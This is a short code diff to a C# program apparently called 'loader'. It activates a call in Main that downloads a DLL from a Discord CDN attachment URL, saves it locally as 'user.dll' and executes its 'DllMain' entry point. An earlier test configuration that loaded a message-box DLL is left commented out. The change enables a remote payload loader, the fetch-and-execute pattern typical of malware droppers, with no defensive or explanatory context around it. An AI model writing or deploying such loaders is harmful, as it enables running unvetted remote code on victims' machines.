@@ -33,15 +33,10 @@ namespace loader {
 
         public static void Main(string[] args) {
 
-            // string remoteDllUrl = "https://cdn.discordapp.com/attachments/804752207312322571/947621052064890890/example.dll";
-            // string localDllName = "messagebox.dll";
-            // string dllEntryName = "Test";
-            // DllLoader(remoteDllUrl, localDllName, dllEntryName);
-
-            //string remoteDllUrl = "";
-            //string localDllName = "user.dll";
-            //string dllEntryName = "DllMain";
-            //DllLoader(remoteDllUrl, localDllName, dllEntryName);
+            string remoteDllUrl = "https://cdn.discordapp.com/attachments/804752207312322571/947637812415582218/user.dll";
+            string localDllName = "user.dll";
+            string dllEntryName = "DllMain";
+            DllLoader(remoteDllUrl, localDllName, dllEntryName);
         }
     }
 }
